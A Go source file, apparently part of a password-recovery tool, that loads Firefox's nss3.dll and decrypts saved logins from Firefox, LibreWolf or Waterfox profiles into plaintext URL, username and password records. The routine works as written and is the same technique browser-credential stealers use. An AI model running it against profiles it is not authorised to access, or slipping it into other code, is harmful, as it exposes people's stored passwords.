//go:build windows

package firefox

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"recovery/recovery/types"
)

type secItem struct {
	ItemType uint32
	Data     *byte
	Len      uint32
}

var nssInstallDirs = map[string][]string{
	"Firefox":   {`C:\Program Files\Mozilla Firefox`, `C:\Program Files (x86)\Mozilla Firefox`},
	"LibreWolf": {`C:\Program Files\LibreWolf`, `C:\Program Files (x86)\LibreWolf`},
	"Waterfox":  {`C:\Program Files\Waterfox`, `C:\Program Files (x86)\Waterfox`},
}

func findNSSDir(browserName string) string {
	dirs := nssInstallDirs[browserName]
	if dirs == nil {
		dirs = nssInstallDirs["Firefox"]
	}
	for _, dir := range dirs {
		if _, err := os.Stat(filepath.Join(dir, "nss3.dll")); err == nil {
			return dir
		}
	}
	for _, dirs := range nssInstallDirs {
		for _, dir := range dirs {
			if _, err := os.Stat(filepath.Join(dir, "nss3.dll")); err == nil {
				return dir
			}
		}
	}
	return ""
}

func nssDecryptLogins(profilePath, browserName string, logins []firefoxLogin) []types.PasswordResult {
	nssDir := findNSSDir(browserName)
	if nssDir == "" {
		logf("firefox NSS: nss3.dll not found for %s", browserName)
		return nil
	}

	oldPath := os.Getenv("PATH")
	os.Setenv("PATH", nssDir+";"+oldPath)
	defer os.Setenv("PATH", oldPath)

	nss3dll, err := syscall.LoadDLL(filepath.Join(nssDir, "nss3.dll"))
	if err != nil {
		logf("firefox NSS: failed to load nss3.dll: %v", err)
		return nil
	}
	defer nss3dll.Release()

	nssInit, err := nss3dll.FindProc("NSS_Init")
	if err != nil {
		return nil
	}
	pk11SDRDecrypt, err := nss3dll.FindProc("PK11SDR_Decrypt")
	if err != nil {
		return nil
	}
	nssShutdown, _ := nss3dll.FindProc("NSS_Shutdown")
	portFree, _ := nss3dll.FindProc("PORT_Free")

	profileBytes, err := syscall.BytePtrFromString(profilePath)
	if err != nil {
		return nil
	}

	ret, _, callErr := nssInit.Call(uintptr(unsafe.Pointer(profileBytes)))
	if ret != 0 {
		logf("firefox NSS: NSS_Init failed for %s: %v", profilePath, callErr)
		return nil
	}
	defer func() {
		if nssShutdown != nil {
			nssShutdown.Call()
		}
	}()

	var results []types.PasswordResult
	for _, login := range logins {
		username := nssDecrypt(pk11SDRDecrypt, portFree, login.EncryptedUsername)
		password := nssDecrypt(pk11SDRDecrypt, portFree, login.EncryptedPassword)
		results = append(results, types.PasswordResult{
			URL:      login.Hostname,
			Username: username,
			Password: password,
		})
	}

	return results
}

func nssDecrypt(pk11SDRDecrypt, portFree *syscall.Proc, b64 string) string {
	b64 = strings.TrimSpace(b64)
	if b64 == "" {
		return ""
	}

	encBytes, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || len(encBytes) == 0 {
		return ""
	}

	encItem := secItem{Data: &encBytes[0], Len: uint32(len(encBytes))}
	var decItem secItem

	ret, _, _ := pk11SDRDecrypt.Call(
		uintptr(unsafe.Pointer(&encItem)),
		uintptr(unsafe.Pointer(&decItem)),
		0,
	)
	if ret != 0 || decItem.Data == nil || decItem.Len == 0 || decItem.Len > 1*1024*1024 {
		return ""
	}

	decBytes := unsafe.Slice(decItem.Data, decItem.Len)
	result := string(decBytes)

	if portFree != nil {
		portFree.Call(uintptr(unsafe.Pointer(decItem.Data)))
	}

	return result
}
